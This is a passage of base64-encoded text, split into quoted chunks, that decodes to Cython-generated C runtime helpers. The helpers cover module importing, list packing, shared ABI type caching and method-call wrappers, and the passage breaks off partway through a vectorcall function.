W1wb3J0X0dldE1vZHVsZShuYW1lKTsKI2VuZGlmCiAgICByZXR1cm4gaW1wb3J0ZWRfbW9kdWxlOwp9CnN0YXRpYyBQeU9iamVjdCAqX19QeXhfSW1wb3J0RG90dGVkTW9kdWxlX1dhbGtQYXJ0cyhQeU9iamVjdCAqbW9kdWxlLCBQeU9iamVjdCAqbmFtZSwgUHlPYmplY3QgKnBhcnRzX3R1cGxlKSB7CiAgICBQeV9zc2l6ZV90IGksIG5wYXJ0czsKI2lmIENZVEhPTl9BU1NVTUVfU0FGRV9TSVpFCiAgICBucGFydHMgPSBQeVR1cGxlX0dFVF9TSVpFKHBhcnRzX3R1cGxlKTsKI2Vsc2UKICAgIG5wYXJ0cyA9IFB5VHVwbGVfU2l6ZShwYXJ0c190dXBsZSk7CiAgICBpZiAobnBhcnRzIDwgMCkgcmV0dXJuIE5VTEw7CiNlbmRpZgogICAgZm9yIChpPTE7IGkgPCBucGFydHMgJiYgbW9kdWxlOyBpKyspIHsKICAgICAgICBQeU9iamVjdCAqcGFydCwgKnN1Ym1vZHVsZTsKI2lmIENZVEhPTl9BU1NVTUVfU0FGRV9NQUNST1MgJiYgIUNZVEhPTl9BVk9JRF9CT1JST1dFRF9SRUZTCiAgICAgICAgcGFydCA9IFB5VHVwbGVfR0VUX0lURU0ocGFydHNfdHVwbGUsIGkpOwojZWxzZQogICAgICAgIHBhcnQgPSBfX1B5eF9QeVNlcXVlbmNlX0lURU0ocGFydHNfdHVwbGUsIGkpOwogICAgICAgIGlmICghcGFydCkgcmV0dXJuIE5VTEw7CiNlbmRpZgogICAgICAgIHN1Ym1vZHVsZSA9IF9fUHl4X1B5T2JqZWN0X0dldEF0dHJTdHJOb0Vycm9yKG1vZHVsZSwgcGFydCk7CiNpZiAhKENZVEhPTl9BU1NVTUVfU0FGRV9NQUNST1MgJiYgIUNZVEhPTl9BVk9JRF9CT1JST1dFRF9SRUZTKQogICAgICAgIFB5X0RFQ1JFRihwYXJ0KTsKI2VuZGlmCiAgICAgICAgUHlfREVDUkVGKG1vZHVsZSk7CiAgICAgICAgbW9kdWxlID0gc3VibW9kdWxlOwogICAgfQogICAgaWYgKHVubGlrZWx5KCFtb2R1bGUpKSB7CiAgICAgICAgcmV0dXJuIF9fUHl4X19JbXBvcnREb3R0ZWRNb2R1bGVfRXJyb3IobmFtZSwgcGFydHNfdHVwbGUsIGkpOwogICAgfQogICAgcmV0dXJuIG1vZHVsZTsKfQpzdGF0aWMgUHlPYmplY3QgKl9fUHl4X19JbXBvcnREb3R0ZWRNb2R1bGUoUHlPYmplY3QgKm5hbWUsIFB5T2JqZWN0ICpwYXJ0c190dXBsZSkgewogICAgUHlPYmplY3QgKmltcG9ydGVkX21vZHVsZTsKICAgIFB5T2JqZWN0""ICptb2R1bGUgPSBfX1B5eF9JbXBvcnQobmFtZSwgTlVMTCwgMCk7CiAgICBpZiAoIXBhcnRzX3R1cGxlIHx8IHVubGlrZWx5KCFtb2R1bGUpKQogICAgICAgIHJldHVybiBtb2R1bGU7CiAgICBpbXBvcnRlZF9tb2R1bGUgPSBfX1B5eF9fSW1wb3J0RG90dGVkTW9kdWxlX0xvb2t1cChuYW1lKTsKICAgIGlmIChsaWtlbHkoaW1wb3J0ZWRfbW9kdWxlKSkgewogICAgICAgIFB5X0RFQ1JFRihtb2R1bGUpOwogICAgICAgIHJldHVybiBpbXBvcnRlZF9tb2R1bGU7CiAgICB9CiAgICBQeUVycl9DbGVhcigpOwogICAgcmV0dXJuIF9fUHl4X0ltcG9ydERvdHRlZE1vZHVsZV9XYWxrUGFydHMobW9kdWxlLCBuYW1lLCBwYXJ0c190dXBsZSk7Cn0Kc3RhdGljIFB5T2JqZWN0ICpfX1B5eF9JbXBvcnREb3R0ZWRNb2R1bGUoUHlPYmplY3QgKm5hbWUsIFB5T2JqZWN0ICpwYXJ0c190dXBsZSkgewojaWYgQ1lUSE9OX0NPTVBJTElOR19JTl9DUFlUSE9OCiAgICBQeU9iamVjdCAqbW9kdWxlID0gX19QeXhfX0ltcG9ydERvdHRlZE1vZHVsZV9Mb29rdXAobmFtZSk7CiAgICBpZiAobGlrZWx5KG1vZHVsZSkpIHsKICAgICAgICBQeU9iamVjdCAqc3BlYyA9IF9fUHl4X1B5T2JqZWN0X0dldEF0dHJTdHJOb0Vycm9yKG1vZHVsZSwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X3NwZWMpOwogICAgICAgIGlmIChsaWtlbHkoc3BlYykpIHsKICAgICAgICAgICAgUHlPYmplY3QgKnVuc2FmZSA9IF9fUHl4X1B5T2JqZWN0X0dldEF0dHJTdHJOb0Vycm9yKHNwZWMsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9pbml0aWFsaXppbmcpOwogICAgICAgICAgICBpZiAobGlrZWx5KCF1bnNhZmUgfHwgIV9fUHl4X1B5T2JqZWN0X0lzVHJ1ZSh1bnNhZmUpKSkgewogICAgICAgICAgICAgICAgUHlfREVDUkVGKHNwZWMpOwogICAgICAgICAgICAgICAgc3BlYyA9IE5VTEw7CiAgICAgICAgICAgIH0KICAgICAgICAgICAgUHlfWERFQ1JFRih1bnNhZmUpOwogICAgICAgIH0KICAgICAgICBpZiAobGlrZWx5KCFzcGVjKSkgewogICAgICAgICAgICBQeUVycl9DbGVhcigpOwogICAgICAgICAgICByZXR1cm4gbW9kdWxlOwogICAgICAgIH0KICAgICAgICBQeV9ERUNSRUYoc3BlYyk7CiAgICAgICAgUHlfREVDUkVGKG1vZHVsZSk7CiAgICB9IGVsc2UgaWYgKFB5RXJyX09jY3VycmVkKCkpIHsKICAgICAgICBQeUVycl9DbGVhcigpOwogICAgfQojZW5kaWYKICAgIHJldHVybiBfX1B5eF9fSW1wb3J0RG90dGVkTW9kdWxlKG5hbWUsIHBhcnRzX3R1cGxlKTsKfQoKCnN0YXRpYyBQeU9iamVjdCAqX19QeXhfUHlMaXN0X1BhY2soUHlfc3NpemVfdCBuLCAuLi4pIHsKICAgIHZhX2xpc3QgdmE7CiAgICBQeU9iamVjdCAqbCA9IFB5TGlzdF9OZXcobik7CiAgICB2YV9zdGFydCh2YSwgbik7CiAgICBpZiAodW5saWtlbHkoIWwpKSBnb3RvIGVuZDsKICAgIGZvciAoUHlfc3NpemVfdCBpPTA7IGk8bjsgKytpKSB7CiAgICAgICAgUHlPYmplY3QgKmFyZyA9IHZh""X2FyZyh2YSwgUHlPYmplY3QqKTsKICAgICAgICBQeV9JTkNSRUYoYXJnKTsKICAgICAgICBpZiAoX19QeXhfUHlMaXN0X1NFVF9JVEVNKGwsIGksIGFyZykgIT0gKDApKSB7CiAgICAgICAgICAgIFB5X0NMRUFSKGwpOwogICAgICAgICAgICBnb3RvIGVuZDsKICAgICAgICB9CiAgICB9CiAgICBlbmQ6CiAgICB2YV9lbmQodmEpOwogICAgcmV0dXJuIGw7Cn0KCgpzdGF0aWMgUHlPYmplY3QqIF9fUHl4X0ltcG9ydEZyb20oUHlPYmplY3QqIG1vZHVsZSwgUHlPYmplY3QqIG5hbWUpIHsKICAgIFB5T2JqZWN0KiB2YWx1ZSA9IF9fUHl4X1B5T2JqZWN0X0dldEF0dHJTdHIobW9kdWxlLCBuYW1lKTsKICAgIGlmICh1bmxpa2VseSghdmFsdWUpICYmIFB5RXJyX0V4Y2VwdGlvbk1hdGNoZXMoUHlFeGNfQXR0cmlidXRlRXJyb3IpKSB7CiAgICAgICAgY29uc3QgY2hhciogbW9kdWxlX25hbWVfc3RyID0gMDsKICAgICAgICBQeU9iamVjdCogbW9kdWxlX25hbWUgPSAwOwogICAgICAgIFB5T2JqZWN0KiBtb2R1bGVfZG90ID0gMDsKICAgICAgICBQeU9iamVjdCogZnVsbF9uYW1lID0gMDsKICAgICAgICBQeUVycl9DbGVhcigpOwogICAgICAgIG1vZHVsZV9uYW1lX3N0ciA9IFB5TW9kdWxlX0dldE5hbWUobW9kdWxlKTsKICAgICAgICBpZiAodW5saWtlbHkoIW1vZHVsZV9uYW1lX3N0cikpIHsgZ290byBtb2RiYWQ7IH0KICAgICAgICBtb2R1bGVfbmFtZSA9IFB5VW5pY29kZV9Gcm9tU3RyaW5nKG1vZHVsZV9uYW1lX3N0cik7CiAgICAgICAgaWYgKHVubGlrZWx5KCFtb2R1bGVfbmFtZSkpIHsgZ290byBtb2RiYWQ7IH0KICAgICAgICBtb2R1bGVfZG90ID0gUHlVbmljb2RlX0NvbmNhdChtb2R1bGVfbmFtZSwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfa3BfdV9fMyk7CiAgICAgICAgaWYgKHVubGlrZWx5KCFtb2R1bGVfZG90KSkgeyBnb3RvIG1vZGJhZDsgfQogICAgICAgIGZ1bGxfbmFtZSA9IFB5VW5pY29kZV9Db25jYXQobW9kdWxlX2RvdCwgbmFtZSk7CiAgICAgICAgaWYgKHVubGlrZWx5KCFmdWxsX25hbWUpKSB7IGdvdG8gbW9kYmFkOyB9CiAgICAgICAgI2lmIChDWVRIT05fQ09NUElMSU5HX0lOX1BZUFkgJiYgUFlQWV9WRVJTSU9OX05VTSAgPCAweDA3MDMwNDAwKSB8fFwKICAgICAgICAgICAgICAgIENZVEhPTl9DT01QSUxJTkdfSU5fR1JBQUwKICAgICAgICB7CiAgICAgICAgICAgIFB5T2JqZWN0ICptb2R1bGVzID0gUHlJbXBvcnRfR2V0TW9kdWxlRGljdCgpOwogICAgICAgICAgICBpZiAodW5saWtlbHkoIW1vZHVsZXMpKQogICAgICAgICAgICAgICAgZ290byBtb2RiYWQ7CiAgICAgICAgICAgIHZhbHVlID0gUHlPYmplY3RfR2V0SXRlbShtb2R1bGVzLCBmdWxsX25hbWUpOwogICAgICAgIH0KICAgICAgICAjZWxzZQogICAgICAgIHZhbHVlID0gUHlJbXBvcnRfR2V0TW9kdWxlKGZ1bGxfbmFtZSk7CiAgICAgICAgI2VuZGlmCiAgICAgIG1vZGJhZDoKICAgICAgICBQeV9YREVDUkVGKGZ1bGxfbmFtZSk7CiAgICAgICAg""UHlfWERFQ1JFRihtb2R1bGVfZG90KTsKICAgICAgICBQeV9YREVDUkVGKG1vZHVsZV9uYW1lKTsKICAgIH0KICAgIGlmICh1bmxpa2VseSghdmFsdWUpKSB7CiAgICAgICAgUHlFcnJfRm9ybWF0KFB5RXhjX0ltcG9ydEVycm9yLCAiY2Fubm90IGltcG9ydCBuYW1lICVTIiwgbmFtZSk7CiAgICB9CiAgICByZXR1cm4gdmFsdWU7Cn0KCgpzdGF0aWMgUHlPYmplY3QgKl9fUHl4X0ZldGNoU2hhcmVkQ3l0aG9uQUJJTW9kdWxlKHZvaWQpIHsKICAgIHJldHVybiBfX1B5eF9QeUltcG9ydF9BZGRNb2R1bGVSZWYoX19QWVhfQUJJX01PRFVMRV9OQU1FKTsKfQoKCnN0YXRpYyBDWVRIT05fSU5MSU5FIFB5T2JqZWN0ICpfX1B5eF9QeURpY3RfU2V0RGVmYXVsdChQeU9iamVjdCAqZCwgUHlPYmplY3QgKmtleSwgUHlPYmplY3QgKmRlZmF1bHRfdmFsdWUsCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBpbnQgaXNfc2FmZV90eXBlKSB7CiAgICBQeU9iamVjdCogdmFsdWU7CiAgICBDWVRIT05fTUFZQkVfVU5VU0VEX1ZBUihpc19zYWZlX3R5cGUpOwojaWYgQ1lUSE9OX0NPTVBJTElOR19JTl9MSU1JVEVEX0FQSQogICAgdmFsdWUgPSBQeU9iamVjdF9DYWxsTWV0aG9kKGQsICJzZXRkZWZhdWx0IiwgIk9PIiwga2V5LCBkZWZhdWx0X3ZhbHVlKTsKI2VsaWYgUFlfVkVSU0lPTl9IRVggPj0gMHgwMzBkMDAwMAogICAgUHlEaWN0X1NldERlZmF1bHRSZWYoZCwga2V5LCBkZWZhdWx0X3ZhbHVlLCAmdmFsdWUpOwojZWxzZQogICAgdmFsdWUgPSBQeURpY3RfU2V0RGVmYXVsdChkLCBrZXksIGRlZmF1bHRfdmFsdWUpOwogICAgaWYgKHVubGlrZWx5KCF2YWx1ZSkpIHJldHVybiBOVUxMOwogICAgUHlfSU5DUkVGKHZhbHVlKTsKI2VuZGlmCiAgICByZXR1cm4gdmFsdWU7Cn0KCgojaWYgX19QWVhfTElNSVRFRF9WRVJTSU9OX0hFWCA8IDB4MDMwQzAwMDAKc3RhdGljIFB5T2JqZWN0KiBfX1B5eF9QeVR5cGVfRnJvbU1ldGFjbGFzcyhQeVR5cGVPYmplY3QgKm1ldGFjbGFzcywgUHlPYmplY3QgKm1vZHVsZSwgUHlUeXBlX1NwZWMgKnNwZWMsIFB5T2JqZWN0ICpiYXNlcykgewogICAgUHlPYmplY3QgKnJlc3VsdCA9IF9fUHl4X1B5VHlwZV9Gcm9tTW9kdWxlQW5kU3BlYyhtb2R1bGUsIHNwZWMsIGJhc2VzKTsKICAgIGlmIChyZXN1bHQgJiYgbWV0YWNsYXNzKSB7CiAgICAgICAgUHlPYmplY3QgKm9sZF90cCA9IChQeU9iamVjdCopUHlfVFlQRShyZXN1bHQpOwogICAgUHlfSU5DUkVGKChQeU9iamVjdCopbWV0YWNsYXNzKTsKI2lmIF9fUFlYX0xJTUlURURfVkVSU0lPTl9IRVggPj0gMHgwMzA5MDAwMAogICAgICAgIFB5X1NFVF9UWVBFKHJlc3VsdCwgbWV0YWNsYXNzKTsKI2Vsc2UKICAgICAgICByZXN1bHQtPm9iX3R5cGUgPSBtZXRhY2xhc3M7CiNlbmRpZgogICAgICAgIFB5X0RFQ1JFRihvbGRfdHApOwogICAgfQogICAgcmV0dXJuIHJlc3VsdDsKfQojZWxzZQojZGVmaW5lIF9fUHl4X1B5VHlwZV9G""cm9tTWV0YWNsYXNzKG1lLCBtbywgcywgYikgUHlUeXBlX0Zyb21NZXRhY2xhc3MobWUsIG1vLCBzLCBiKQojZW5kaWYKc3RhdGljIGludCBfX1B5eF9WZXJpZnlDYWNoZWRUeXBlKFB5T2JqZWN0ICpjYWNoZWRfdHlwZSwKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGNvbnN0IGNoYXIgKm5hbWUsCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBQeV9zc2l6ZV90IGV4cGVjdGVkX2Jhc2ljc2l6ZSkgewogICAgUHlfc3NpemVfdCBiYXNpY3NpemU7CiAgICBpZiAoIVB5VHlwZV9DaGVjayhjYWNoZWRfdHlwZSkpIHsKICAgICAgICBQeUVycl9Gb3JtYXQoUHlFeGNfVHlwZUVycm9yLAogICAgICAgICAgICAiU2hhcmVkIEN5dGhvbiB0eXBlICUuMjAwcyBpcyBub3QgYSB0eXBlIG9iamVjdCIsIG5hbWUpOwogICAgICAgIHJldHVybiAtMTsKICAgIH0KICAgIGlmIChleHBlY3RlZF9iYXNpY3NpemUgPT0gMCkgewogICAgICAgIHJldHVybiAwOyAvLyBzaXplIGlzIGluaGVyaXRlZCwgbm90aGluZyB1c2VmdWwgdG8gY2hlY2sKICAgIH0KI2lmIENZVEhPTl9DT01QSUxJTkdfSU5fTElNSVRFRF9BUEkKICAgIFB5T2JqZWN0ICpweV9iYXNpY3NpemU7CiAgICBweV9iYXNpY3NpemUgPSBQeU9iamVjdF9HZXRBdHRyU3RyaW5nKGNhY2hlZF90eXBlLCAiX19iYXNpY3NpemVfXyIpOwogICAgaWYgKHVubGlrZWx5KCFweV9iYXNpY3NpemUpKSByZXR1cm4gLTE7CiAgICBiYXNpY3NpemUgPSBQeUxvbmdfQXNTc2l6ZV90KHB5X2Jhc2ljc2l6ZSk7CiAgICBQeV9ERUNSRUYocHlfYmFzaWNzaXplKTsKICAgIHB5X2Jhc2ljc2l6ZSA9IE5VTEw7CiAgICBpZiAodW5saWtlbHkoYmFzaWNzaXplID09IChQeV9zc2l6ZV90KS0xKSAmJiBQeUVycl9PY2N1cnJlZCgpKSByZXR1cm4gLTE7CiNlbHNlCiAgICBiYXNpY3NpemUgPSAoKFB5VHlwZU9iamVjdCopIGNhY2hlZF90eXBlKS0+dHBfYmFzaWNzaXplOwojZW5kaWYKICAgIGlmIChiYXNpY3NpemUgIT0gZXhwZWN0ZWRfYmFzaWNzaXplKSB7CiAgICAgICAgUHlFcnJfRm9ybWF0KFB5RXhjX1R5cGVFcnJvciwKICAgICAgICAgICAgIlNoYXJlZCBDeXRob24gdHlwZSAlLjIwMHMgaGFzIHRoZSB3cm9uZyBzaXplLCB0cnkgcmVjb21waWxpbmciLAogICAgICAgICAgICBuYW1lKTsKICAgICAgICByZXR1cm4gLTE7CiAgICB9CiAgICByZXR1cm4gMDsKfQpzdGF0aWMgUHlUeXBlT2JqZWN0ICpfX1B5eF9GZXRjaENvbW1vblR5cGVGcm9tU3BlYyhQeVR5cGVPYmplY3QgKm1ldGFjbGFzcywgUHlPYmplY3QgKm1vZHVsZSwgUHlUeXBlX1NwZWMgKnNwZWMsIFB5T2JqZWN0ICpiYXNlcykgewogICAgUHlPYmplY3QgKmFiaV9tb2R1bGUgPSBOVUxMLCAqY2FjaGVkX3R5cGUgPSBOVUxMLCAqYWJpX21vZHVsZV9kaWN0LCAqbmV3X2NhY2hlZF90eXBlLCAqcHlfb2JqZWN0X25hbWU7CiAgICBpbnQgZ2V0X2l0ZW1fcmVmX3Jlc3VsdDsKICAgIGNvbnN0IGNoYXIqIG9iamVjdF9uYW1lID0gc3RycmNocihz""cGVjLT5uYW1lLCAnLicpOwogICAgb2JqZWN0X25hbWUgPSBvYmplY3RfbmFtZSA/IG9iamVjdF9uYW1lKzEgOiBzcGVjLT5uYW1lOwogICAgcHlfb2JqZWN0X25hbWUgPSBQeVVuaWNvZGVfRnJvbVN0cmluZyhvYmplY3RfbmFtZSk7CiAgICBpZiAoIXB5X29iamVjdF9uYW1lKSByZXR1cm4gTlVMTDsKICAgIGFiaV9tb2R1bGUgPSBfX1B5eF9GZXRjaFNoYXJlZEN5dGhvbkFCSU1vZHVsZSgpOwogICAgaWYgKCFhYmlfbW9kdWxlKSBnb3RvIGRvbmU7CiAgICBhYmlfbW9kdWxlX2RpY3QgPSBQeU1vZHVsZV9HZXREaWN0KGFiaV9tb2R1bGUpOwogICAgaWYgKCFhYmlfbW9kdWxlX2RpY3QpIGdvdG8gZG9uZTsKICAgIGdldF9pdGVtX3JlZl9yZXN1bHQgPSBfX1B5eF9QeURpY3RfR2V0SXRlbVJlZihhYmlfbW9kdWxlX2RpY3QsIHB5X29iamVjdF9uYW1lLCAmY2FjaGVkX3R5cGUpOwogICAgaWYgKGdldF9pdGVtX3JlZl9yZXN1bHQgPT0gMSkgewogICAgICAgIGlmIChfX1B5eF9WZXJpZnlDYWNoZWRUeXBlKAogICAgICAgICAgICAgIGNhY2hlZF90eXBlLAogICAgICAgICAgICAgIG9iamVjdF9uYW1lLAogICAgICAgICAgICAgIHNwZWMtPmJhc2ljc2l6ZSkgPCAwKSB7CiAgICAgICAgICAgIGdvdG8gYmFkOwogICAgICAgIH0KICAgICAgICBnb3RvIGRvbmU7CiAgICB9IGVsc2UgaWYgKHVubGlrZWx5KGdldF9pdGVtX3JlZl9yZXN1bHQgPT0gLTEpKSB7CiAgICAgICAgZ290byBiYWQ7CiAgICB9CiAgICBDWVRIT05fVU5VU0VEX1ZBUihtb2R1bGUpOwogICAgY2FjaGVkX3R5cGUgPSBfX1B5eF9QeVR5cGVfRnJvbU1ldGFjbGFzcyhtZXRhY2xhc3MsIGFiaV9tb2R1bGUsIHNwZWMsIGJhc2VzKTsKICAgIGlmICh1bmxpa2VseSghY2FjaGVkX3R5cGUpKSBnb3RvIGJhZDsKICAgIGlmICh1bmxpa2VseShfX1B5eF9maXhfdXBfZXh0ZW5zaW9uX3R5cGVfZnJvbV9zcGVjKHNwZWMsIChQeVR5cGVPYmplY3QgKikgY2FjaGVkX3R5cGUpIDwgMCkpIGdvdG8gYmFkOwogICAgbmV3X2NhY2hlZF90eXBlID0gX19QeXhfUHlEaWN0X1NldERlZmF1bHQoYWJpX21vZHVsZV9kaWN0LCBweV9vYmplY3RfbmFtZSwgY2FjaGVkX3R5cGUsIDEpOwogICAgaWYgKHVubGlrZWx5KG5ld19jYWNoZWRfdHlwZSAhPSBjYWNoZWRfdHlwZSkpIHsKICAgICAgICBpZiAodW5saWtlbHkoIW5ld19jYWNoZWRfdHlwZSkpIGdvdG8gYmFkOwogICAgICAgIFB5X0RFQ1JFRihjYWNoZWRfdHlwZSk7CiAgICAgICAgY2FjaGVkX3R5cGUgPSBuZXdfY2FjaGVkX3R5cGU7CiAgICAgICAgaWYgKF9fUHl4X1ZlcmlmeUNhY2hlZFR5cGUoCiAgICAgICAgICAgICAgICBjYWNoZWRfdHlwZSwKICAgICAgICAgICAgICAgIG9iamVjdF9uYW1lLAogICAgICAgICAgICAgICAgc3BlYy0+YmFzaWNzaXplKSA8IDApIHsKICAgICAgICAgICAgZ290byBiYWQ7CiAgICAgICAgfQogICAgICAgIGdvdG8gZG9uZTsKICAgIH0gZWxzZSB7CiAgICAgICAgUHlfREVDUkVGKG5ld19jYWNoZWRfdHlwZSk7""CiAgICB9CmRvbmU6CiAgICBQeV9YREVDUkVGKGFiaV9tb2R1bGUpOwogICAgUHlfREVDUkVGKHB5X29iamVjdF9uYW1lKTsKICAgIGFzc2VydChjYWNoZWRfdHlwZSA9PSBOVUxMIHx8IFB5VHlwZV9DaGVjayhjYWNoZWRfdHlwZSkpOwogICAgcmV0dXJuIChQeVR5cGVPYmplY3QgKikgY2FjaGVkX3R5cGU7CmJhZDoKICAgIFB5X1hERUNSRUYoY2FjaGVkX3R5cGUpOwogICAgY2FjaGVkX3R5cGUgPSBOVUxMOwogICAgZ290byBkb25lOwp9CgoKUHlPYmplY3QqIF9fcHl4X0NvbW1vblR5cGVzTWV0YWNsYXNzX2dldF9tb2R1bGUoQ1lUSE9OX1VOVVNFRCBQeU9iamVjdCAqc2VsZiwgQ1lUSE9OX1VOVVNFRCB2b2lkKiBjb250ZXh0KSB7CiAgICByZXR1cm4gUHlVbmljb2RlX0Zyb21TdHJpbmcoX19QWVhfQUJJX01PRFVMRV9OQU1FKTsKfQpzdGF0aWMgUHlHZXRTZXREZWYgX19weXhfQ29tbW9uVHlwZXNNZXRhY2xhc3NfZ2V0c2V0W10gPSB7CiAgICB7Il9fbW9kdWxlX18iLCBfX3B5eF9Db21tb25UeXBlc01ldGFjbGFzc19nZXRfbW9kdWxlLCBOVUxMLCBOVUxMLCBOVUxMfSwKICAgIHswLCAwLCAwLCAwLCAwfQp9OwpzdGF0aWMgUHlUeXBlX1Nsb3QgX19weXhfQ29tbW9uVHlwZXNNZXRhY2xhc3Nfc2xvdHNbXSA9IHsKICAgIHtQeV90cF9nZXRzZXQsICh2b2lkICopX19weXhfQ29tbW9uVHlwZXNNZXRhY2xhc3NfZ2V0c2V0fSwKICAgIHswLCAwfQp9OwpzdGF0aWMgUHlUeXBlX1NwZWMgX19weXhfQ29tbW9uVHlwZXNNZXRhY2xhc3Nfc3BlYyA9IHsKICAgIF9fUFlYX1RZUEVfTU9EVUxFX1BSRUZJWCAiX2NvbW1vbl90eXBlc19tZXRhdHlwZSIsCiAgICAwLAogICAgMCwKI2lmIFBZX1ZFUlNJT05fSEVYID49IDB4MDMwQTAwMDAKICAgIFB5X1RQRkxBR1NfSU1NVVRBQkxFVFlQRSB8CiAgICBQeV9UUEZMQUdTX0RJU0FMTE9XX0lOU1RBTlRJQVRJT04gfAojZW5kaWYKICAgIFB5X1RQRkxBR1NfREVGQVVMVCwKICAgIF9fcHl4X0NvbW1vblR5cGVzTWV0YWNsYXNzX3Nsb3RzCn07CnN0YXRpYyBpbnQgX19weXhfQ29tbW9uVHlwZXNNZXRhY2xhc3NfaW5pdChQeU9iamVjdCAqbW9kdWxlKSB7CiAgICBfX3B5eF9tc3RhdGV0eXBlICptc3RhdGUgPSBfX1B5eF9QeU1vZHVsZV9HZXRTdGF0ZShtb2R1bGUpOwogICAgUHlPYmplY3QgKmJhc2VzID0gUHlUdXBsZV9QYWNrKDEsICZQeVR5cGVfVHlwZSk7CiAgICBpZiAodW5saWtlbHkoIWJhc2VzKSkgewogICAgICAgIHJldHVybiAtMTsKICAgIH0KICAgIG1zdGF0ZS0+X19weXhfQ29tbW9uVHlwZXNNZXRhY2xhc3NUeXBlID0gX19QeXhfRmV0Y2hDb21tb25UeXBlRnJvbVNwZWMoTlVMTCwgbW9kdWxlLCAmX19weXhfQ29tbW9uVHlwZXNNZXRhY2xhc3Nfc3BlYywgYmFzZXMpOwogICAgaWYgKHVubGlrZWx5KG1zdGF0ZS0+X19weXhfQ29tbW9uVHlwZXNNZXRhY2xhc3NUeXBlID09IE5VTEwpKSB7CiAgICAgICAgcmV0dXJuIC0xOwogICAgfQogICAgcmV0dXJuIDA7Cn0KCgojaWYgQ1lUSE9OX0NP""TVBJTElOR19JTl9MSU1JVEVEX0FQSQpzdGF0aWMgUHlPYmplY3QgKl9fUHl4X1B5TWV0aG9kX05ldyhQeU9iamVjdCAqZnVuYywgUHlPYmplY3QgKnNlbGYsIFB5T2JqZWN0ICp0eXApIHsKICAgIFB5T2JqZWN0ICpyZXN1bHQ7CiAgICBDWVRIT05fVU5VU0VEX1ZBUih0eXApOwogICAgaWYgKCFzZWxmKQogICAgICAgIHJldHVybiBfX1B5eF9OZXdSZWYoZnVuYyk7CiAgICAjaWYgX19QWVhfTElNSVRFRF9WRVJTSU9OX0hFWCA+PSAweDAzMEMwMDAwCiAgICB7CiAgICAgICAgUHlPYmplY3QgKmFyZ3NbXSA9IHtmdW5jLCBzZWxmfTsKICAgICAgICByZXN1bHQgPSBQeU9iamVjdF9WZWN0b3JjYWxsKF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fUHl4X0NhY2hlZE1ldGhvZFR5cGUsIGFyZ3MsIDIsIE5VTEwpOwogICAgfQogICAgI2Vsc2UKICAgIHJlc3VsdCA9IFB5T2JqZWN0X0NhbGxGdW5jdGlvbk9iakFyZ3MoX19weXhfbXN0YXRlX2dsb2JhbC0+X19QeXhfQ2FjaGVkTWV0aG9kVHlwZSwgZnVuYywgc2VsZiwgTlVMTCk7CiAgICAjZW5kaWYKICAgIHJldHVybiByZXN1bHQ7Cn0KI2Vsc2UKc3RhdGljIFB5T2JqZWN0ICpfX1B5eF9QeU1ldGhvZF9OZXcoUHlPYmplY3QgKmZ1bmMsIFB5T2JqZWN0ICpzZWxmLCBQeU9iamVjdCAqdHlwKSB7CiAgICBDWVRIT05fVU5VU0VEX1ZBUih0eXApOwogICAgaWYgKCFzZWxmKQogICAgICAgIHJldHVybiBfX1B5eF9OZXdSZWYoZnVuYyk7CiAgICByZXR1cm4gUHlNZXRob2RfTmV3KGZ1bmMsIHNlbGYpOwp9CiNlbmRpZgoKCiNpZiBDWVRIT05fTUVUSF9GQVNUQ0FMTCAmJiAoQ1lUSE9OX1ZFQ1RPUkNBTEwgfHwgQ1lUSE9OX0JBQ0tQT1JUX1ZFQ1RPUkNBTEwpCnN0YXRpYyBQeU9iamVjdCAqX19QeXhfUHlWZWN0b3JjYWxsX0Zhc3RDYWxsRGljdF9rdyhQeU9iamVjdCAqZnVuYywgX19weXhfdmVjdG9yY2FsbGZ1bmMgdmMsIFB5T2JqZWN0ICpjb25zdCAqYXJncywgc2l6ZV90IG5hcmdzLCBQeU9iamVjdCAqa3cpCnsKICAgIFB5T2JqZWN0ICpyZXMgPSBOVUxMOwogICAgUHlPYmplY3QgKmt3bmFtZXM7CiAgICBQeU9iamVjdCAqKm5ld2FyZ3M7CiAgICBQeU9iamVjdCAqKmt3dmFsdWVzOwogICAgUHlfc3NpemVfdCBpLCBwb3M7CiAgICBzaXplX3QgajsKICAgIFB5T2JqZWN0ICprZXksICp2YWx1ZTsKICAgIHVuc2lnbmVkIGxvbmcga2V5c19hcmVfc3RyaW5nczsKICAgICNpZiAhQ1lUSE9OX0FTU1VNRV9TQUZFX1NJWkUKICAgIFB5X3NzaXplX3Qgbmt3ID0gUHlEaWN0X1NpemUoa3cpOwogICAgaWYgKHVubGlrZWx5KG5rdyA9PSAtMSkpIHJldHVybiBOVUxMOwogICAgI2Vsc2UKICAgIFB5X3NzaXplX3Qgbmt3ID0gUHlEaWN0X0dFVF9TSVpFKGt3KTsKICAgICNlbmRpZgogICAgbmV3YXJncyA9IChQeU9iamVjdCAqKilQeU1lbV9NYWxsb2MoKG5hcmdzICsgKHNpemVfdClua3cpICogc2l6ZW9mKGFyZ3NbMF0pKTsKICAgIGlmICh1bmxpa2VseShuZXdhcmdzID09IE5VTEwpKSB7CiAgICAgICAgUHlF""cnJfTm9NZW1vcnkoKTsKICAgICAgICByZXR1cm4gTlVMTDsKICAgIH0KICAgIGZvciAoaiA9IDA7IGogPCBuYXJnczsgaisrKSBuZXdhcmdzW2pdID0gYXJnc1tqXTsKICAgIGt3bmFtZXMgPSBQeVR1cGxlX05ldyhua3cpOwogICAgaWYgKHVubGlrZWx5KGt3bmFtZXMgPT0gTlVMTCkpIHsKICAgICAgICBQeU1lbV9GcmVlKG5ld2FyZ3MpOwogICAgICAgIHJldHVybiBOVUxMOwogICAgfQogICAga3d2YWx1ZXMgPSBuZXdhcmdzICsgbmFyZ3M7CiAgICBwb3MgPSBpID0gMDsKICAgIGtleXNfYXJlX3N0cmluZ3MgPSBQeV9UUEZMQUdTX1VOSUNPREVfU1VCQ0xBU1M7CiAgICB3aGlsZSAoUHlEaWN0X05leHQoa3csICZwb3MsICZrZXksICZ2YWx1ZSkpIHsKICAgICAgICBrZXlzX2FyZV9zdHJpbmdzICY9CiAgICAgICAgI2lmIENZVEhPTl9DT01QSUxJTkdfSU5fTElNSVRFRF9BUEkK